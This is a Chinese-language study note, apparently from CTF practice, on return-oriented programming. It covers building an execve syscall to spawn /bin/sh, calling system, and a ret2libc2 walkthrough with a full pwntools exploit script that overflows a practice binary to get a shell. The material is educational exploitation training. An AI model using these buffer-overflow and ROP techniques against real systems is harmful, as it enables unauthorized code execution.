
系统调用 shell	(execve)  
构造execve系统调用的汇编
![[wiki_rop_01.png]]
其中sysenter是系统终端,int 0x80 也可以

eax  = 0xb (调用号)  	         							
ebx = '/bin/shell' 字符串地址 '/sh' 也可以	 
ecx = 0    							
edx = 0
int 0x80 


系统调用 shell (system)
这是一个函数，别忘了构造它的返回地址
![[wiki_rop_02.png]]

还有两种shell，目前还未实现
1.使用fork 和 execl函数

```
#include <unistd.h>

int main() {
    if (fork() == 0) {
        execl("/bin/sh", "sh", NULL);
    }
    return 0;
}

```

2.使用 popen 函数
```
#include <stdio.h>

int main() {
    FILE *fp;
    fp = popen("/bin/sh", "r");
    pclose(fp);
    return 0;
}

```




- ret2libc2
![[wiki_rop_03.png]]
该题没有’bin/shell‘字符串，需要我们手动构造gets函数写入’bin/shell‘

```
溢出点 ret      gets地址
				system地址  (gets返回地址)
				buf         (gets参数/gets返回地址)
				buf         (system参数，此时已经写上了'bin/shell')

ps:这里的函数地址都不能是call,而是jump,返回地址要我们自己构造
```

exp如下
```
from pwn import *
import time
sh = process('./ret2libc2')
elf = ELF('./ret2libc2')
buf = 0x804a080

#system_plt = 0x08048490
system_plt = elf.plt['system']
#gets_plt = 0x08048460
gets_plt = elf.plt['gets']

gdb.attach(sh)
sleep(10)

payload = flat([b'a'*112,gets_plt,system_plt,buf,buf])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()

```



